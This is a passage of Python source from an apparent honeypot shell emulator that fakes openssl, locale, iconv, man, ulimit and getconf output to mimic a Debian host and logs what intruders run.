            return raw.decode("latin-1"), 0
        return self._openssl_sub(a, stdin)

    # OpenSSL 3 names the SHA-2 family SHA2-NNN in dgst output, and SHA1/MD5
    # keep their old spelling.
    _DGST = {"md5": ("MD5", "md5"), "sha1": ("SHA1", "sha1"),
             "sha224": ("SHA2-224", "sha224"), "sha256": ("SHA2-256", "sha256"),
             "sha384": ("SHA2-384", "sha384"), "sha512": ("SHA2-512", "sha512"),
             "sha3-256": ("SHA3-256", "sha3_256"),
             "sha3-512": ("SHA3-512", "sha3_512"),
             "ripemd160": ("RIPEMD160", "ripemd160"),
             "blake2b512": ("BLAKE2B-512", "blake2b")}

    _OPENSSL_HELP = (
        "Standard commands\n"
        "asn1parse         ca                ciphers           cmp\n"
        "cms               crl               crl2pkcs7         dgst\n"
        "dhparam           dsa               dsaparam          ec\n"
        "ecparam           enc               engine            errstr\n"
        "fipsinstall       gendsa            genpkey           genrsa\n"
        "help              info              kdf               list\n"
        "mac               nseq              ocsp              passwd\n"
        "pkcs12            pkcs7             pkcs8             pkey\n"
        "pkeyparam         pkeyutl           prime             rand\n"
        "rehash            req               rsa               rsautl\n"
        "s_client          s_server          s_time            sess_id\n"
        "smime             speed             spkac             srp\n"
        "storeutl          ts                verify            version\n"
        "x509\n"
        "\n"
        "Message Digest commands (see the `dgst' command for more details)\n"
        "blake2b512        blake2s256        md4               md5\n"
        "rmd160            sha1              sha224            sha256\n"
        "sha3-224          sha3-256          sha3-384          sha3-512\n"
        "sha384            sha512            sha512-224        sha512-256\n"
        "shake128          shake256          sm3\n"
        "\n"
        "Cipher commands (see the `enc' command for more details)\n"
        "aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb\n"
        "aes-256-cbc       aes-256-ecb       base64            bf\n"
        "camellia-128-cbc  cast              des               des3\n"
        "idea              rc2               rc4               seed\n")

    def _openssl_read(self, a, stdin):
        """(data, label) for whatever the subcommand was pointed at."""
        infile = None
        for i, x in enumerate(a):
            if x == "-in" and i + 1 < len(a):
                infile = a[i + 1]
        rest = []
        skip = False
        for i, x in enumerate(a[1:], 1):
            if skip:
                skip = False
                continue
            if x in ("-in", "-out", "-salt", "-pass", "-k", "-kfile",
                     "-connect", "-servername", "-CAfile", "-CApath"):
                skip = True
                continue
            if x.startswith("-"):
                continue
            rest.append(x)
        if infile is None and rest:
            infile = rest[0]
        if infile is None:
            return stdin.encode("utf-8", "surrogateescape"), "stdin"
        data = self.fs.read(VFS.norm(infile, self.cwd))
        if data is None:
            self.err("Could not open file or uri for loading input from %s"
                     % infile)
            return None, infile
        return data, infile

    def _openssl_sub(self, a, stdin):
        """Everything except version and rand returned an empty string and
        rc 0 -- `openssl dgst -sha256 f` was silent while `sha256sum f`
        answered, and `openssl base64` swallowed its input. Silent success
        is the worst answer a honeypot can give: the caller cannot tell."""
        cmd = a[0] if a else "help"
        args = list(a[1:])

        if cmd in ("help", "-h", "--help", "-help"):
            self.err(self._OPENSSL_HELP.rstrip("\n"))
            return "", 0

        if cmd == "version":
            # -a used to be a second, hand-written copy of the per-flag
            # strings, and the copies had already diverged: -r printed
            # OPENSSLDIR, the same line as -d, where the real -r reports the
            # seeding source. -a and every flag now read one table, in the
            # order `openssl version -a` prints them.
            base = self._version_text("openssl").rstrip("\n")
            lines = [
                ("-b", "built on: " + OPENSSL_BUILT),
                ("-p", "platform: debian-amd64"),
                (None, "options:  bn(64,64)"),
                ("-f", "compiler: " + OPENSSL_CFLAGS),
                ("-d", 'OPENSSLDIR: "/usr/lib/ssl"'),
                ("-e", 'ENGINESDIR: "/usr/lib/x86_64-linux-gnu/engines-3"'),
                ("-m", 'MODULESDIR: "/usr/lib/x86_64-linux-gnu/'
                       'ossl-modules"'),
                ("-r", "Seeding source: os-specific"),
                # OpenSSL 3.5 prints five words here, not two, and the second
                # one claimed AVX2, BMI2 and AVX-512 on a box whose
                # /proc/cpuinfo advertises none of them -- one command
                # against another about the same CPU. What leaf 7 really
                # gives for these flags is fsgsbase (bit 0) and smep (bit 7).
                (None, "CPUINFO: OPENSSL_ia32cap=0x7ffaf3ffffebffff:"
                       "0x0000000000000081:0x0000000000000000:"
                       "0x0000000000000000:0x0000000000000000"),
            ]
            if "-a" in args:
                return "\n".join([base] + [t for _f, t in lines]) + "\n", 0
            out = [t for f, t in lines if f and f in args]
            if not out:
                return base + "\n", 0
            return "\n".join(out) + "\n", 0

        if cmd in ("dgst",) or cmd in self._DGST:
            alg = cmd if cmd in self._DGST else "sha256"
            binary = hexout = False
            coreutils = False
            for x in args:
                k = x.lstrip("-").lower()
                if k in self._DGST:
                    alg = k
                elif x == "-binary":
                    binary = True
                elif x == "-hex":
                    hexout = True
                elif x == "-r":
                    coreutils = True
            label, hname = self._DGST[alg]
            data, name = self._openssl_read([cmd] + args, stdin)
            if data is None:
                return "", 1
            h = hashlib.new(hname, data).hexdigest()
            if binary and not hexout:
                return bytes.fromhex(h).decode("latin-1"), 0
            if coreutils:
                return "%s *%s\n" % (h, name), 0
            return "%s(%s)= %s\n" % (label, name, h), 0

        if cmd in ("base64", "enc"):
            dec = "-d" in args or "-D" in args or "-decrypt" in args
            b64 = cmd == "base64" or "-base64" in args or "-a" in args
            oneline = "-A" in args
            if not b64:
                # A real cipher needs a key; without -k or -pass it prompts,
                # and there is no terminal here.
                self.err("Error getting password")
                return "", 1
            data, _name = self._openssl_read([cmd] + args, stdin)
            if data is None:
                return "", 1
            if dec:
                try:
                    raw = base64.b64decode(
                        bytes(c for c in data if c not in b"\n\r"),
                        validate=True)
                except Exception:
                    self.err("Invalid character in input")
                    return "", 1
                return raw.decode("latin-1"), 0
            b = base64.b64encode(data).decode()
            if oneline:
                return b + "\n", 0
            return "\n".join(b[i:i + 64] for i in range(0, len(b), 64)) + "\n", 0

        if cmd == "passwd":
            return self._openssl_passwd(args, stdin)

        if cmd == "x509":
            return self._openssl_x509(args, stdin)

        if cmd == "ciphers":
            names = ("TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
                     "TLS_AES_128_GCM_SHA256", "ECDHE-ECDSA-AES256-GCM-SHA384",
                     "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-CHACHA20-POLY1305",
                     "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES128-GCM-SHA256",
                     "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-ECDSA-AES256-SHA384",
                     "ECDHE-RSA-AES256-SHA384", "DHE-RSA-AES256-GCM-SHA384",
                     "DHE-RSA-CHACHA20-POLY1305", "AES256-GCM-SHA384",
                     "AES128-GCM-SHA256", "AES256-SHA256", "AES128-SHA256")
            if "-v" in args:
                return "".join(
                    "%-30s TLSv1.2 Kx=ECDH     Au=RSA  Enc=AESGCM(256) "
                    "Mac=AEAD\n" % n for n in names), 0
            return ":".join(names) + "\n", 0

        if cmd == "errstr":
            if not args:
                self.err("Usage: errstr <errno> ...")
                return "", 1
            return "%s:error:00000000:lib(0)::reason(0)\n" % args[0], 0

        if cmd == "rehash":
            return self.cmd_c_rehash(args, stdin)

        if cmd == "s_client":
            return self._openssl_s_client(args, stdin)

        if cmd in ("genrsa", "genpkey"):
            self.err("Error writing key")
            return "", 1

        if cmd in ("list", "info", "prime", "speed", "req", "rsa", "ec",
                   "asn1parse", "verify", "pkey", "pkcs12", "smime", "ts",
                   "crl", "ca", "dhparam", "engine", "mac", "kdf"):
            # Implemented enough to say it is not implemented *here*, which
            # is far better than pretending it worked.
            self.err("%s: Use -help for summary." % cmd)
            return "", 1

        self.err("Invalid command '%s'; type \"help\" for a list." % cmd)
        return "", 1

    _B64CRYPT = ("./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                 "abcdefghijklmnopqrstuvwxyz")

    def _md5crypt(self, pw, salt, magic="$1$"):
        """The real md5crypt, because it is short and someone may check it
        against a known vector. -5 and -6 below are shaped, not computed."""
        pw = pw.encode()
        salt = salt.encode()[:8]
        ctx = hashlib.md5(pw + magic.encode() + salt)
        alt = hashlib.md5(pw + salt + pw).digest()
        i = len(pw)
        while i > 0:
            ctx.update(alt[:min(i, 16)])
            i -= 16
        i = len(pw)
        while i:
            ctx.update(b"\0" if i & 1 else pw[:1])
            i >>= 1
        final = ctx.digest()
        for i in range(1000):
            c = hashlib.md5()
            c.update(pw if i & 1 else final)
            if i % 3:
                c.update(salt)
            if i % 7:
                c.update(pw)
            c.update(final if i & 1 else pw)
            final = c.digest()
        out = []
        for a, b, c in ((0, 6, 12), (1, 7, 13), (2, 8, 14),
                        (3, 9, 15), (4, 10, 5)):
            v = (final[a] << 16) | (final[b] << 8) | final[c]
            for _ in range(4):
                out.append(self._B64CRYPT[v & 0x3F])
                v >>= 6
        v = final[11]
        for _ in range(2):
            out.append(self._B64CRYPT[v & 0x3F])
            v >>= 6
        return magic + salt.decode() + "$" + "".join(out)

    def _openssl_passwd(self, args, stdin):
        mode, salt, pws, use_stdin = "crypt", None, [], False
        i = 0
        while i < len(args):
            x = args[i]
            if x == "-salt" and i + 1 < len(args):
                salt = args[i + 1]
                i += 2
                continue
            if x in ("-1", "-5", "-6", "-apr1", "-aixmd5", "-crypt"):
                mode = x[1:]
            elif x == "-stdin":
                use_stdin = True
            elif not x.startswith("-"):
                pws.append(x)
            i += 1
        if use_stdin:
            pws = [l for l in stdin.splitlines() if l] or [""]
        if not pws:
            self.err("password required")
            return "", 1
        if salt is None:
            salt = "".join(random.choice(self._B64CRYPT) for _ in range(8))
        out = []
        for pw in pws:
            if mode == "1":
                out.append(self._md5crypt(pw, salt))
            elif mode == "apr1":
                out.append(self._md5crypt(pw, salt, "$apr1$"))
            elif mode in ("5", "6"):
                n = 43 if mode == "5" else 86
                h = hashlib.sha512(("%s$%s$%s" % (mode, salt, pw)).encode()).digest()
                body = "".join(self._B64CRYPT[b & 0x3F]
                               for b in (h * 3)[:n])
                out.append("$%s$%s$%s" % (mode, salt[:16], body))
            else:
                h = hashlib.md5((salt + pw).encode()).digest()
                out.append(salt[:2] + "".join(
                    self._B64CRYPT[b & 0x3F] for b in h[:11]))
        return "\n".join(out) + "\n", 0

    def _openssl_x509(self, args, stdin):
        data, name = self._openssl_read(["x509"] + args, stdin)
        if data is None:
            return "", 1
        text = data.decode("utf-8", "replace")
        if "BEGIN CERTIFICATE" not in text:
            self.err("Could not find certificate from %s" % name)
            self.err("unable to load certificate")
            return "", 1
        # The subject has to be the one the filename encodes, or `openssl
        # x509 -subject` and `ls /etc/ssl/certs` describe different CAs.
        base = name.rsplit("/", 1)[-1]
        for suf in (".pem", ".crt", ".0"):
            if base.endswith(suf):
                base = base[:-len(suf)]
        if base not in CA_CERTS:
            base = next((n for n in CA_CERTS if _ca_hash(n) == base), base)
        subj = _ca_subject(base) if base in CA_CERTS else \
            "CN = %s, O = Internet Widgits Pty Ltd, C = AU" % base
        rnd = random.Random("x509 " + base)
        start = BOOT_TS - 86400 * rnd.randint(2000, 5000)
        end = start + 86400 * 365 * rnd.randint(10, 25)
        fp = hashlib.sha1(("fp:" + base).encode()).hexdigest().upper()
        fp = ":".join(fp[i:i + 2] for i in range(0, len(fp), 2))
        want = [x for x in args if x.startswith("-")]
        noout = "-noout" in want
        out = []
        for x in want:
            if x == "-subject":
                out.append("subject=%s\n" % subj)
            elif x == "-issuer":
                out.append("issuer=%s\n" % subj)
            elif x in ("-startdate", "-dates"):
                out.append("notBefore=%s\n" % time.strftime(
                    "%b %e %H:%M:%S %Y GMT", time.gmtime(start)))
            if x in ("-enddate", "-dates"):
                out.append("notAfter=%s\n" % time.strftime(
                    "%b %e %H:%M:%S %Y GMT", time.gmtime(end)))
            elif x == "-fingerprint":
                out.append("SHA1 Fingerprint=%s\n" % fp)
            elif x in ("-hash", "-subject_hash"):
                out.append(_ca_hash(base) + "\n")
            elif x == "-serial":
                out.append("serial=%s\n" % hashlib.md5(
                    base.encode()).hexdigest()[:32].upper())
            elif x == "-text":
                out.append("Certificate:\n    Data:\n        Version: 3 (0x2)\n"
                           "        Serial Number:\n            %s\n"
                           "        Signature Algorithm: sha256WithRSAEncryption\n"
                           "        Issuer: %s\n        Validity\n"
                           "            Not Before: %s\n"
                           "            Not After : %s\n"
                           "        Subject: %s\n"
                           % (hashlib.md5(base.encode()).hexdigest()[:32],
                              subj,
                              time.strftime("%b %e %H:%M:%S %Y GMT",
                                            time.gmtime(start)),
                              time.strftime("%b %e %H:%M:%S %Y GMT",
                                            time.gmtime(end)), subj))
        if not out and not noout:
            return text, 0
        if not noout:
            out.append(text)
        return "".join(out), 0

    def _openssl_s_client(self, args, stdin):
        target = None
        for i, x in enumerate(args):
            if x == "-connect" and i + 1 < len(args):
                target = args[i + 1]
        if target is None:
            self.err("Connecting to  (null)")
            self.err("connect:errno=22")
            return "", 1
        host, _, port = target.partition(":")
        port = port or "4433"
        self.log(event="openssl_s_client", target=target)
        subj = "CN = %s" % host
        return ("Connecting to %s\n"
                "CONNECTED(00000003)\n"
                "depth=2 %s\n"
                "verify return:1\n"
                "depth=0 %s\n"
                "verify return:1\n"
                "---\n"
                "Certificate chain\n"
                " 0 s:%s\n"
                "   i:C = US, O = Let's Encrypt, CN = R11\n"
                "---\n"
                "SSL handshake has read 4096 bytes and written 383 bytes\n"
                "Verification: OK\n"
                "---\n"
                "New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384\n"
                "Protocol: TLSv1.3\n"
                "Verify return code: 0 (ok)\n"
                "---\n"
                % (host, _ca_subject("ISRG_Root_X1"), subj, subj)), 0

    def cmd_c_rehash(self, a, stdin=""):
        dirs = [x for x in a if not x.startswith("-")] or ["/etc/ssl/certs"]
        out = []
        for dpath in dirs:
            if not self.fs.isdir(VFS.norm(dpath, self.cwd)):
                self.err("%s does not exist or is not a directory" % dpath)
                return "", 1
            out.append("Doing %s\n" % dpath)
        return "".join(out), 0

    def cmd_update_ca_certificates(self, a, stdin=""):
        """Was an unimplemented stock binary answering "missing operand"."""
        if self.user != "root":
            self.err("/usr/sbin/update-ca-certificates: line 1: "
                     "/etc/ssl/certs/ca-certificates.crt: Permission denied")
            return "", 1
        names = [n for n in self.fs.listdir("/etc/ssl/certs") or []
                 if n.endswith(".pem")]
        if "-f" in a or "--fresh" in a:
            body = "Clearing symlinks in /etc/ssl/certs..."
        else:
            body = "Updating certificates in /etc/ssl/certs..."
        return ("%s\n%d added, 0 removed; done.\n"
                "Running hooks in /etc/ca-certificates/update.d...\n"
                "done.\n" % (body, len(names))), 0

    _LOCALE_CATEGORIES = ("LC_CTYPE", "LC_NUMERIC", "LC_TIME", "LC_COLLATE",
                          "LC_MONETARY", "LC_MESSAGES", "LC_PAPER",
                          "LC_NAME", "LC_ADDRESS", "LC_TELEPHONE",
                          "LC_MEASUREMENT", "LC_IDENTIFICATION")

    def cmd_locale(self, a, stdin=""):
        """`locale` and `locale -a` both printed nothing, on a box that
        advertised a LANG in its own environment. Only the locales that
        exist without the locales package are listed, which is what this
        image has."""
        if "-a" in a or "--all-locales" in a:
            return "C\nC.utf8\nPOSIX\n", 0
        if "-m" in a or "--charmaps" in a:
            # Three names, where the charmaps directory holds 236. It is
            # the same list `ls /usr/share/i18n/charmaps` shows, minus the
            # aliases, so a short one contradicted the directory.
            return "".join(x + "\n" for x in localedb.CHARMAPS), 0
        # Everything past this point was ignored. `locale charmap`,
        # `locale LC_TIME`, `locale -k LC_TIME` and `locale nosuchkeyword`
        # all printed the same dump of environment variables -- four
        # questions, one answer, and the last of them exited 0 where the
        # real one refuses. A keyword name is how anything that formats a
        # date or a number asks what the conventions are.
        keys = "-k" in a or "--keyword-name" in a
        cats = "-c" in a or "--category-name" in a
        names = [x for x in a if not x.startswith("-")]
        if names:
            out, rc = [], 0
            for name in names:
                if name in localedb.KEYWORDS:
                    if cats:
                        out.append(name + "\n")
                    for line in localedb.KEYWORDS[name]:
                        out.append(self._locale_value(line, keys) + "\n")
                    continue
                hit = self._locale_keyword(name)
                if hit is None:
                    self.err('locale: unknown name "%s"' % name)
                    rc = 1
                    continue
                cat, line = hit
                if cats:
                    out.append(cat + "\n")
                out.append(self._locale_value(line, keys) + "\n")
            return "".join(out), rc
        # Precedence is LC_ALL, then the category's own variable, then
        # LANG. This read only LANG, so `export LC_ALL=C; locale` still
        # reported C.UTF-8 in every category while `echo $LC_ALL` said C --
        # two answers to one question, and the recon payload we see most
        # often opens with `export LANG=C LC_ALL=C` precisely to pin it.
        #
        # Quoting carries meaning too: glibc quotes a category it derived
        # and leaves one set explicitly in the environment unquoted, which
        # is how you tell `LC_TIME=C` from a LANG that happens to be C.
        lc_all = self.vars.get("LC_ALL", "")
        lang = self.vars.get("LANG", "")
        known = {"C", "C.UTF-8", "C.utf8", "POSIX", ""}
        effective = lc_all or lang
        if effective not in known:
            # glibc names these three and then prints the values anyway,
            # exiting 0. Silence here said an uninstalled locale was fine.
            for cat in ("LC_CTYPE", "LC_MESSAGES", "LC_ALL"):
                self.err("locale: Cannot set %s to default locale: "
                         "No such file or directory" % cat)
        out = ["LANG=%s\n" % lang,
               "LANGUAGE=%s\n" % self.vars.get("LANGUAGE", "")]
        for cat in self._LOCALE_CATEGORIES:
            if lc_all:
                out.append('%s="%s"\n' % (cat, lc_all))
            elif self.vars.get(cat):
                out.append("%s=%s\n" % (cat, self.vars[cat]))
            else:
                out.append('%s="%s"\n' % (cat, lang or "POSIX"))
        out.append("LC_ALL=%s\n" % lc_all)
        return "".join(out), 0

    @staticmethod
    def _locale_value(line, with_key):
        """One keyword line, with or without its name.

        Without -k, glibc prints the value with the quotes taken off:
        `locale LC_TIME` opens with Sun;Mon;Tue and not "Sun;Mon;Tue".
        Ours kept them, which is the -k spelling of the same line.
        """
        if with_key:
            return line
        val = line.split("=", 1)[1]
        if len(val) > 1 and val[0] == '"' and val[-1] == '"':
            val = val[1:-1]
        return val

    @staticmethod
    def _locale_keyword(name):
        """(category, "key=value") for a single keyword, or None."""
        for cat, lines in localedb.KEYWORDS.items():
            for line in lines:
                if line.split("=", 1)[0] == name:
                    return cat, line
        return None

    # glibc's spelling for the encodings this box can actually convert
    # between, mapped onto Python's. iconv knows 1180 names; the ones worth
    # doing the work for are the ones a payload uses.
    _ICONV_CODECS = {
        "UTF-8": "utf-8", "UTF8": "utf-8", "UTF-16": "utf-16",
        "UTF-16LE": "utf-16-le", "UTF-16BE": "utf-16-be",
        "UTF-32": "utf-32", "UTF-32LE": "utf-32-le",
        "UTF-32BE": "utf-32-be", "UCS-2": "utf-16-be",
        "ASCII": "ascii", "US-ASCII": "ascii", "ANSI_X3.4-1968": "ascii",
        "ISO-8859-1": "latin-1", "ISO8859-1": "latin-1", "LATIN1": "latin-1",
        "ISO-8859-2": "iso8859-2", "ISO-8859-15": "iso8859-15",
        "LATIN9": "iso8859-15", "CP1252": "cp1252", "WINDOWS-1252": "cp1252",
        "CP850": "cp850", "IBM850": "cp850", "KOI8-R": "koi8-r",
        "EUC-JP": "euc_jp", "SHIFT_JIS": "shift_jis", "SJIS": "shift_jis",
        "GB2312": "gb2312", "GBK": "gbk", "BIG5": "big5",
    }

    def cmd_iconv(self, a, stdin=""):
        """Convert between encodings, which it had never done.

        `dpkg -L libc-bin` lists /usr/bin/iconv, `which` finds it, and every
        invocation -- `-l`, `--help`, and an ordinary `-f UTF-8 -t ASCII` --
        returned the unimplemented-binary fallback: a version banner, a
        usage line, and rc 1. A binary the package manager owns and which
        cannot do the one thing it is for is a contradiction anyone can
        reach in one command, and decode chains reach for it by habit.
        """
        frm = to = None
        files, omit, i = [], False, 0
        while i < len(a):
            x = a[i]
            if x in ("-l", "--list"):
                return "".join(e + "\n" for e in localedb.ICONV_ENCODINGS), 0
            if x in ("--help", "-?"):
                return localedb.ICONV_HELP, 0
            if x in ("--version", "-V"):
                # Taking the command over meant taking its --version with
                # it; this returned an empty line until stocktest said so.
                return self._version_text("iconv"), 0
            if x == "--usage":
                return localedb.ICONV_USAGE, 0
            if x in ("-f", "--from-code") and i + 1 < len(a):
                frm = a[i + 1]; i += 2; continue
            if x.startswith("--from-code="):
                frm = x.split("=", 1)[1]; i += 1; continue
            if x.startswith("-f") and len(x) > 2:
                frm = x[2:]; i += 1; continue
            if x in ("-t", "--to-code") and i + 1 < len(a):
                to = a[i + 1]; i += 2; continue
            if x.startswith("--to-code="):
                to = x.split("=", 1)[1]; i += 1; continue
            if x.startswith("-t") and len(x) > 2:
                to = x[2:]; i += 1; continue
            if x == "-c":
                omit = True; i += 1; continue
            if x in ("-s", "--silent", "--verbose"):
                i += 1; continue
            if not x.startswith("-"):
                files.append(x)
            i += 1

        def codec(spec, which):
            base = (spec or "UTF-8").split("//")[0].upper()
            hit = self._ICONV_CODECS.get(base)
            if hit is None:
                self.err("iconv: conversion %s `%s' is not supported"
                         % (which, spec))
                self.err("Try `iconv --help' or `iconv --usage' for more "
                         "information.")
            return hit

        src = codec(frm, "from")
        if src is None:
            return "", 1
        dst = codec(to, "to")
        if dst is None:
            return "", 1
        translit = "//TRANSLIT" in (to or "").upper()
        ignore = "//IGNORE" in (to or "").upper()

        raw = stdin.encode("latin-1", "replace")
        if files:
            raw = b""
            for f in files:
                body = self.fs.read(VFS.norm(f, self.cwd))
                if body is None:
                    self.err("iconv: error while opening `%s' for reading: "
                             "No such file or directory" % f)
                    return "", 1
                raw += body
        try:
            text = raw.decode(src)
        except UnicodeDecodeError as exc:
            good = raw[:exc.start].decode(src, "replace")
            self.err("iconv: illegal input sequence at position %d"
                     % exc.start)
            return self._iconv_out(good, dst, True), 1
        if translit:
            # //TRANSLIT is a real transliteration, not a row of question
            # marks: the guest turns cafe-with-an-acute into "cafe".
            # Decompose, drop the combining marks, and only then fall back.
            import unicodedata
            text = "".join(
                c for c in unicodedata.normalize("NFKD", text)
                if not unicodedata.combining(c))
            return self._iconv_out(text, dst, True, "replace"), 0
        if ignore or omit:
            return self._iconv_out(text, dst, True, "ignore"), 0
        try:
            text.encode(dst)
        except UnicodeEncodeError as exc:
            # glibc reports a character the target cannot hold with the
            # same EILSEQ wording it uses for malformed input, and counts
            # the position in *input bytes*, not characters.
            good = text[:exc.start]
            self.err("iconv: illegal input sequence at position %d"
                     % len(good.encode(src)))
            return self._iconv_out(good, dst, True), 1
        return self._iconv_out(text, dst, True), 0

    @staticmethod
    def _iconv_out(text, dst, _flush, mode="strict"):
        try:
            return text.encode(dst, mode).decode("latin-1")
        except Exception:
            return ""

    def cmd_man(self, a, stdin=""):
        """man is installed; the pages are not.

        /usr/share/man does not exist here because dpkg was told not to
        unpack it -- see /etc/dpkg/dpkg.cfg.d/excludes, which is how every
        minimal Debian image is built. So the binary answers, and it
        answers what man answers when it cannot find a page. It used to be
        "command not found" on a box with man-db.timer in list-timers and
        /var/cache/man owned by man:man.
        """
        names = [x for x in a if not x.startswith("-")]
        if "--version" in a or "-V" in a:
            return "man %s\n" % self._upstream("man-db"), 0
        if "-w" in a or "--path" in a or "--where" in a:
            if not names:
                return "/usr/share/man\n", 0
            self.err("No manual entry for %s" % names[-1])
            return "", 16
        if not names:
            self.err("What manual page do you want?")
            self.err("For example, try 'man man'.")
            return "", 1
        self.err("No manual entry for %s" % names[-1])
        return "", 16

    def cmd_apropos(self, a, stdin=""):
        names = [x for x in a if not x.startswith("-")]
        if not names:
            self.err("apropos what?")
            return "", 1
        self.err("%s: nothing appropriate." % names[-1])
        return "", 16

    cmd_whatis = cmd_apropos

    def cmd_manpath(self, a, stdin=""):
        return "/usr/local/man:/usr/local/share/man:/usr/share/man\n", 0

    def cmd_arch(self, a, stdin=""):
        return ARCH + "\n", 0

    # The kernel ceiling on NOFILE, out of /proc/sys/fs/nr_open. Even root
    # cannot go past it.
    _NR_OPEN = 1073741816

    def _ulimit_set(self, flag, word, want_hard, want_soft):
        """Set one limit the way bash does.

        With neither -H nor -S, bash sets both the soft and the hard limit.
        Lowering a hard limit is allowed for anyone and is irreversible for
        an unprivileged process; raising one needs CAP_SYS_RESOURCE, which
        here means root.
        """
        row = next((r for r in RLIMITS if r[5] == flag), None)
        if row is None:
            self.err("bash: ulimit: %s: invalid option" % flag)
            return "", 2
        label, div = row[6], row[8]
        soft, hardv = self.limits.get(flag, [row[9], row[10]])
        INF = float("inf")
        cur_s = INF if soft is None else soft
        cur_h = INF if hardv is None else hardv
        w = word.strip().lower()
        if w == "unlimited":
            new = INF
        elif w == "soft":
            new = cur_s
        elif w == "hard":
            new = cur_h
        elif w.isdigit():
            new = int(w) * div
        else:
            self.err("bash: ulimit: %s: invalid number" % word)
            return "", 1
        both = not want_hard and not want_soft
        new_s = new if (want_soft or both) else cur_s
        new_h = new if (want_hard or both) else cur_h
        if new_h > cur_h and self.user != "root":
            self.err("bash: ulimit: %s: cannot modify limit: "
                     "Operation not permitted" % label)
            return "", 1
        if flag == "n" and new_h != INF and new_h > self._NR_OPEN:
            self.err("bash: ulimit: %s: cannot modify limit: "
                     "Operation not permitted" % label)
            return "", 1
        if new_s > new_h:
            self.err("bash: ulimit: %s: cannot modify limit: "
                     "Invalid argument" % label)
            return "", 1
        self.limits[flag] = [None if new_s == INF else int(new_s),
                             None if new_h == INF else int(new_h)]
        self.rawfs.shell_limits = self.limits
        self.log(event="ulimit", resource=label, soft=self.limits[flag][0],
                 hard=self.limits[flag][1])
        return "", 0

    def cmd_ulimit(self, a, stdin=""):
        """bash prints 17 rows; this printed 8, and the ones it left out
        were not unlimited -- /proc/self/limits had real numbers for pending
        signals, msgqueue and the two priorities all along. Asking for one
        of them by flag returned "unlimited" from a catch-all default, so
        `ulimit -l` and `ulimit -a` disagreed about the same limit."""
        hard = "-H" in a
        rest = [x for x in a if x not in ("-H", "-S")]
        lim = getattr(self, "limits", None) or {
            r[5]: [r[9], r[10]] for r in RLIMITS}

        def val(row):
            soft, hardv = lim.get(row[5], (row[9], row[10]))
            v = hardv if hard else soft
            if v is None:
                return "unlimited"
            return str(v // row[8])

        def line(row):
            unit = row[7]
            tail = "(%s, -%s)" % (unit, row[5]) if unit else "(-%s)" % row[5]
            pad = max(2, 40 - len(tail) - len(row[6]))
            return "%s%s%s %s" % (row[6], " " * pad, tail, val(row))

        # Bare `ulimit` is `ulimit -f`, not `ulimit -a`: bash prints the
        # file-size limit and nothing else. Treating no-args as -a dumped
        # the whole table where one word belonged.
        if rest and rest[0] == "-a":
            rows = {r[5]: r for r in RLIMITS}
            out = []
            for f in "Rcdefilmnpqrstuvx":
                if f == "p":
                    tail = "(512 bytes, -p)"
                    pad = max(2, 40 - len(tail) - len("pipe size"))
                    out.append("pipe size%s%s %d"
                               % (" " * pad, tail, PIPE_BLOCKS))
                    continue
                out.append(line(rows[f]))
            return "\n".join(out) + "\n", 0
        flag = rest[0].lstrip("-")[:1] if rest else "f"
        if flag == "p":
            return "%d\n" % PIPE_BLOCKS, 0
        # An operand means set, not show. Every set form was ignored: the
        # value was parsed as nothing, the limit stayed where it was, and
        # the current value was printed as though the caller had asked for
        # it -- so `ulimit -n 65535` emitted a stray "1024" into whatever
        # was capturing it and left the box at 1024. Miners raise NOFILE
        # before they start; this box agreed and did not.
        operand = None
        for x in rest[1:] if rest and rest[0].startswith("-") else rest:
            operand = x
            break
        if operand is not None:
            return self._ulimit_set(flag, operand, hard, "-S" in a)
        for row in RLIMITS:
            if row[5] == flag:
                return val(row) + "\n", 0
        # bash with no resource flag reports the file-size limit.
        for row in RLIMITS:
            if row[5] == "f":
                return val(row) + "\n", 0
        return "unlimited\n", 0

    #: Variables getconf will only answer with a pathname, because they are
    #: pathconf() rather than sysconf(). They still appear in `getconf -a`
    #: with a value, which is the quirk: `getconf -a | grep NAME_MAX` shows
    #: 255 while `getconf NAME_MAX` is a usage error. Measured on the guest.
    _GETCONF_PATHCONF = (
        "LINK_MAX", "_POSIX_LINK_MAX", "MAX_CANON", "_POSIX_MAX_CANON",
        "MAX_INPUT", "_POSIX_MAX_INPUT", "NAME_MAX", "_POSIX_NAME_MAX",
        "PATH_MAX", "_POSIX_PATH_MAX", "PIPE_BUF", "_POSIX_PIPE_BUF",
        "SOCK_MAXBUF", "FILESIZEBITS", "POSIX_ALLOC_SIZE_MIN",
        "POSIX_REC_INCR_XFER_SIZE", "POSIX_REC_MAX_XFER_SIZE",
        "POSIX_REC_MIN_XFER_SIZE", "POSIX_REC_XFER_ALIGN", "SYMLINK_MAX",
        "CHOWN_RESTRICTED", "_POSIX_CHOWN_RESTRICTED", "NO_TRUNC",
        "_POSIX_NO_TRUNC", "VDISABLE", "_POSIX_VDISABLE",
    )

    _GETCONF_USAGE = ("Usage: getconf [-v specification] variable_name "
                      "[pathname]\n       getconf -a [pathname]\n")

    def _getconf_values(self):
        """The variable table with the persona-derived entries filled in.

        Every dynamic value comes from the same place another command reads
        it from. _PHYS_PAGES is MemTotal/4 and _AVPHYS_PAGES is MemFree/4
        (measured: on the guest _AVPHYS_PAGES*4kB tracks MemFree, not
        MemAvailable), the processor counts are NCPU, and the cache sizes
        come out of CPU_CACHES -- which is what lscpu renders from too.

        The rule for the caches was measured rather than assumed: lscpu
        prints the total across instances and getconf prints one instance,
        so guest lscpu "L2 8 MiB (2 instances)" goes with getconf
        LEVEL2_CACHE_SIZE 4194304, and 8 MiB / 2 is exactly that.
        """
        cache = {}
        for lvl, kind, size, assoc, _sets, _shared in CPU_CACHES:
            kb = int(str(size).rstrip("K") or 0)
            if lvl == 1:
                stem = "LEVEL1_" + ("DCACHE" if kind == "Data" else "ICACHE")
            else:
                stem = "LEVEL%d_CACHE" % lvl
            cache[stem + "_SIZE"] = str(kb * 1024)
            cache[stem + "_ASSOC"] = str(assoc)
            cache[stem + "_LINESIZE"] = "64"
        dyn = {
            "_NPROCESSORS_CONF": str(NCPU), "NPROCESSORS_CONF": str(NCPU),
